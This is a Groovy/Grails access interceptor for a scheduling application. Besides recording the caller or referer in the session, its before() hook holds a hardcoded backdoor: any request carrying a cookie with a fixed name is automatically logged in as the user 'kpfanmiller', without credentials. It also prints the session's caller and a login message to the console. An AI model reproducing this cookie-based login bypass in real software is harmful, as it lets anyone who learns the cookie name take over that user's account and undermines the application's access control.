package jamnApps.scheduler

import org.apache.commons.lang.RandomStringUtils

class AccessInterceptor {

    boolean before() {
        def caller = params?.caller ?: request.getHeader('referer')
        if (caller && !caller?.contains('login') && !caller?.contains('bookAppointment')){
            println "caller: " + caller
            session.caller = caller
        }else{
            session.caller = null
        }
        if (!session.user && request.getCookie('den146s320!nskjh')){
            println "auto logging Kalin in"
            session.user = User.findByUsername('kpfanmiller')
        }
        true
    }

    boolean after() { 
    	true 
    }

    void afterView() {
        // no-op
    }
}
